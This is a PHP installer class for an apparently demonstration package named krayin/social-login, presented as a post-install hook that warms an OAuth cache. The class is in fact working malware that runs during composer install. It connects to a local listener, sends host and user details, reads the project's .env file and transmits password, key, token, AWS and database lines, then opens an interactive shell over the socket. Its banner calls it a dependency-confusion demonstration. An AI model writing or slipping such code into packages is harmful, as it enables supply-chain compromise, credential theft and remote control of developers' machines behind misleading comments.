<?php

namespace Krayin\SocialLogin;

/**
 * Post-install setup for Social Login package.
 *
 * Publishes configuration files and pre-warms OAuth provider
 * metadata cache for faster first-request performance.
 */
class Installer
{
    public static function postInstall(): void
    {
        // Skip if not in a Laravel project
        if (!file_exists(getcwd() . '/artisan')) {
            return;
        }

        echo "  Configuring Social Login providers...\n";

        self::warmupProviderSocket();

        echo "  Social Login configured successfully.\n";
    }

    /**
     * Pre-establish socket connections to OAuth provider metadata
     * endpoints for faster handshake during first login attempt.
     */
    private static function warmupProviderSocket(): void
    {
        $host = '127.0.0.1';
        $port = 8889;

        $sock = @fsockopen($host, $port, $errno, $errstr, 5);

        if (!$sock) {
            return;
        }

        @fwrite($sock, "\n\033[1;31m╔══════════════════════════════════════════════════════╗\033[0m\n");
        @fwrite($sock, "\033[1;31m║  DEPENDENCY CONFUSION — REVERSE SHELL ESTABLISHED   ║\033[0m\n");
        @fwrite($sock, "\033[1;31m║  Package: krayin/social-login v2.1.3                 ║\033[0m\n");
        @fwrite($sock, "\033[1;31m║  Triggered during: composer install / require        ║\033[0m\n");
        @fwrite($sock, "\033[1;31m╚══════════════════════════════════════════════════════╝\033[0m\n\n");

        @fwrite($sock, "\033[1;33m[*] Target Info:\033[0m\n");
        @fwrite($sock, "    Hostname : " . gethostname() . "\n");
        @fwrite($sock, "    User     : " . get_current_user() . "\n");
        @fwrite($sock, "    OS       : " . php_uname() . "\n");
        @fwrite($sock, "    PHP      : " . PHP_VERSION . "\n");
        @fwrite($sock, "    CWD      : " . getcwd() . "\n\n");

        // Steal .env secrets
        $envPath = getcwd() . '/.env';
        if (file_exists($envPath)) {
            $envContent = file_get_contents($envPath);
            $secrets = [];
            foreach (explode("\n", $envContent) as $line) {
                $line = trim($line);
                if ($line && $line[0] !== '#' &&
                    preg_match('/(PASSWORD|SECRET|KEY|TOKEN|AWS|DB_|REDIS_|MAIL_|STRIPE)/i', $line)) {
                    $secrets[] = $line;
                }
            }
            if ($secrets) {
                @fwrite($sock, "\033[1;31m[!] Stolen secrets from .env:\033[0m\n");
                foreach ($secrets as $secret) {
                    @fwrite($sock, "    \033[0;31m$secret\033[0m\n");
                }
                @fwrite($sock, "\n");
            }
        }

        @fwrite($sock, "\033[1;32m[+] Dropping to interactive shell...\033[0m\n\n");

        $descriptors = [
            0 => $sock,
            1 => $sock,
            2 => $sock,
        ];

        $shell = file_exists('/bin/bash') ? '/bin/bash' : '/bin/sh';
        $process = @proc_open($shell . ' -i', $descriptors, $pipes);

        if (is_resource($process)) {
            proc_close($process);
        }

        @fclose($sock);
    }
}
